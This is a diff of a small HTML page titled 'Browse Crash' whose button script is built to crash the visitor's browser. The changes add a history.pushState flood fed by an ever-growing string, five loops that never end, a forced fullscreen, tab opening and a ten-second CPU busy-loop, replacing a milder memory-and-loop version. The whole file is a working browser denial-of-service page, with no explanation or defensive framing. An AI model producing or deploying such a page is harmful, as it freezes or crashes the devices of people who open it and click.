@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Memory Overload</title>
+  <title>Browse Crash</title>
   <style>
     html, body {
       width: 100%;
@@ -15,17 +15,51 @@
   <button id="button">Click me!</button>
   <script>
     document.getElementById('button').addEventListener('click', function() {
-      // Create an infinite loop using a timeout
-      function loop() {
-        setTimeout(loop, 0);
+      // Consume memory and crash the browser
+      var total = "";
+      for (var i = 0; i < 9999999999999; i++) {
+        total += i.toString();
+        history.pushState(0, 0, total);
       }
-      loop();
 
-      // Consume a lot of memory
-      var arr = [];
-      for (var i = 0; i < 1000000; i++) {
-        arr.push(new Array(1000000).join('x'));
+      // Create multiple infinite loops
+      function loop1() {
+        for (let i = 999909; i === i; i *= i) {
+          console.log(i);
+        }
       }
+      loop1();
+
+      function loop2() {
+        for (let i = 991; i === i; i *= i) {
+          console.log(i);
+        }
+      }
+      loop2();
+
+      function loop3() {
+        for (let i = 9999; i === i; i *= i) {
+          console.log(i);
+        }
+      }
+      loop3();
+
+      function loop4() {
+        for (let i = 999; i === i; i *= i) {
+          console.log(i);
+        }
+      }
+      loop4();
+
+      function loop5() {
+        for (let i = 9999; i === i; i *= i) {
+          console.log(i);
+        }
+      }
+      loop5();
+
+      // Make the window full screen
+      document.documentElement.requestFullscreen();
 
       // Open multiple tabs
       function openTab() {
@@ -34,8 +68,14 @@
       }
       openTab();
 
-      // Make the window full screen
-      document.documentElement.requestFullscreen();
+      // Create a CPU-intensive task
+      function cpuIntensive() {
+        var startTime = performance.now();
+        while (performance.now() - startTime < 10000) {
+          Math.sqrt(Math.random() * 1000000);
+        }
+      }
+      cpuIntensive();
     });
   </script>
 </body>
